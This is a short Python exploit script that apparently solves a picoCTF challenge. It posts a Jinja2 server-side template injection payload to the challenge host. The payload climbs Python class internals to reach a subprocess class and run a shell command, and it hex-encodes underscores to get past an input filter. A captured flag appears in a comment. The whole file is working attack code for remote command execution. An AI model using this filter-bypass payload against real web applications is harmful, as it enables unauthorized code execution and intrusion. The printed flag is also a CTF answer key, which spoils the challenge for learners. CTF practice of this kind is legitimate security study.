import requests

url = "http://shape-facility.picoctf.net:61943/announce"

payload = "{{1|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()}}"
payload = payload.replace("_", "\\x5f")

resp = requests.post(url, data={"content": payload})
print(resp.text)

# picoCTF{sst1_f1lt3r_byp4ss_96a02202}
